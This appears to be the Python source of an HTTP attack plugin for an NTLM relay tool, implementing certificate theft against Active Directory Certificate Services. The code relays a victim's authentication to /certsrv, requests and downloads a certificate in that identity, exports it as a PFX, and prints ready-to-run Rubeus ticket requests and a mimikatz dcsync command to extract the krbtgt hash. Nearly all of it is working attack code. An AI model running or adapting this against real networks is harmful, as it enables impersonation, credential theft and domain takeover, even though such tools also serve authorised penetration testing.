# SECUREAUTH LABS. Copyright 2018 SecureAuth Corporation. All rights reserved.
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# HTTP Attack Class
#
# Authors:
#  Alberto Solino (@agsolino)
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#  Ex Android Dev (@ExAndroidDev)
#
# Description:
#  HTTP protocol relay attack
#
# ToDo:
#
import re
import base64
import logging
import config
import sys
from OpenSSL import crypto
from comm.ntlmrelayx.attacks import ProtocolAttack


PROTOCOL_ATTACK_CLASS = "HTTPAttack"

class HTTPAttack(ProtocolAttack):
    """
    This is the default HTTP attack. This attack only dumps the root page, though
    you can add any complex attack below. self.client is an instance of urrlib.session
    For easy advanced attacks, use the SOCKS option and use curl or a browser to simply
    proxy through ntlmrelayx
    """
    PLUGIN_NAMES = ["HTTP", "HTTPS"]
    def run(self):
        #Default action: Dump requested page to file, named username-targetname.html

        if self.config.isADCSAttack:
            self.adcs_relay_attack()
            return

    def adcs_relay_attack(self):
        key = crypto.PKey()
        key.generate_key(crypto.TYPE_RSA, 4096)

        csr = self.generate_csr(key, self.username)
        csr = csr.decode().replace("\n", "").replace("+", "%2b").replace(" ", "+")
        logging.info("CSR generated!")

        data = "Mode=newreq&CertRequest=%s&CertAttrib=CertificateTemplate:%s&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=" % (csr, self.config.template)

        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": len(data)
        }

        logging.info("Getting certificate...")

        self.client.request("POST", "/certsrv/certfnsh.asp", body=data, headers=headers)
        response = self.client.getresponse()

        if response.status != 200:
            logging.info("Error getting certificate! Make sure you have entered valid certiface template.")
            return

        content = response.read()
        found = re.findall(r'location="certnew.cer\?ReqID=(.*?)&', content.decode())
        if len(found) == 0:
            logging.error("Error obtaining certificate!")
            config.set_pki(True)
            return

        certificate_id = found[0]
        
        self.client.request("GET", "/certsrv/certnew.cer?ReqID=" + certificate_id)
        response = self.client.getresponse()

        logging.info("GOT CERTIFICATE!")
        certificate = response.read().decode()

        certificate_store = self.generate_pfx(key, certificate)
        no_do = self.username.replace("$","")
        b64pfx = base64.b64encode(certificate_store).decode()
        pfx_pass = config.get_pass()
        append = "\nTips:\n    If the target is DC, pls set --template=DomainController.\n    Using DC cert, you can get other users hash with dcsync.\n\n    Example: mimikatz.exe \"lsadump::dcsync /domain:cgdoamin.com /user:krbtgt\" exit"
        Rubeus_usage ="""Exploit successful! \n
-------------------------------------------------------------------------------------------------------
ReqTGT:
    Rubeus.exe asktgt /user:{} /certificate:{} /outfile:{}.tgt /password:{} /enctype:aes256 /opsec

ReqTGS:
    Rubeus.exe asktgs /user:{} /ticket:{}.tgt /service:SPN1,SPN2,... /outfile:{}.tgs /enctype:aes256 /opsec

Change to ccache:
    ticketConverter.py {}.tgs test.ccache
{}
-------------------------------------------------------------------------------------------------------
""".format(self.username, b64pfx, no_do, pfx_pass, self.username, no_do, no_do, no_do, append)
        #logging.critical("Base64 certificate of user %s: \n%s" % (self.username, base64.b64encode(certificate_store).decode()))
        logging.critical(Rubeus_usage)
        config.set_pfx(b64pfx)
        config.set_pki(True)
        config.set_targetName(no_do)

    def generate_csr(self, key, CN):
        logging.info("Generating CSR...")
        req = crypto.X509Req()
        req.get_subject().CN = CN
        req.set_pubkey(key)
        req.sign(key, "sha256")

        return crypto.dump_certificate_request(crypto.FILETYPE_PEM, req)

    def generate_pfx(self, key, certificate):
        certificate = crypto.load_certificate(crypto.FILETYPE_PEM, certificate)
        p12 = crypto.PKCS12()
        p12.set_certificate(certificate)
        p12.set_privatekey(key)
        pfx_pass = config.get_pass()
        return p12.export(pfx_pass)